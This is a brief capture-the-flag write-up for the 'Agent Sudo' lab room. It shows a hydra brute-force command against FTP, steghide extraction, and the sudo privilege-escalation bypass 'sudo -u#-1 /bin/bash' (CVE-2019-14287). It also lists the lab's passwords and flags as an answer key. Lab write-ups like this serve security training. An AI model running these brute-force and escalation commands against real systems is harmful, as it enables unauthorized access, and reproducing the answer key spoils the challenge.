# Agent Sudo 

ip : `10.10.74.56`


## Enumerate

reveals a username
> http://10.10.74.56/agent_C_attention.php


| Questions | Answers |
|-----------|---------|
| How many open ports? | 3 |
| How you redirect yourself to a secret page ? | 
| What is the agent name? | chris |
| 
## Hash Cracking and Bruteforcing

using hydra to bruteforce ftp with user chris
```
hydra -l chris -P /usr/share/wordlist/rockyou.txt 10.10.74.56 ftp -t 4
```
base 64 found
```
echo QXJlYTUx | base64 -d
```

steghide file extract
```
steghide extract -sf  cute-alien.jpg
```
found a new user named : `james` just login with the ssh

| Questions | Answers |
|-----------|---------|
| ftp password | crystal |
| Zip file password | alien |
| steg password | Area51 |
| Who is the other agent(in full name)? | james |
| SSH password | hackerrules! |


## Capture the user flag

| Questions | Answers |
|-----------|---------|
| What is the user flag ? | b03d975e8c92a7c04146cfa7a5a313c7 |
| What is the incident of the photo called ? | Roswell Alien Autopsy |


## Privilege escalation

escalating root privilages 
```
sudo -u#-1 /bin/bash
```

| Questions | Answers |
|-----------|---------|
| CVE number for the escalation | CVE-2019-14287 |
| What is the root flag ? | b53a02f55b57d4439e3341834d70c062 |
| Who is Agent R? | DesKel |

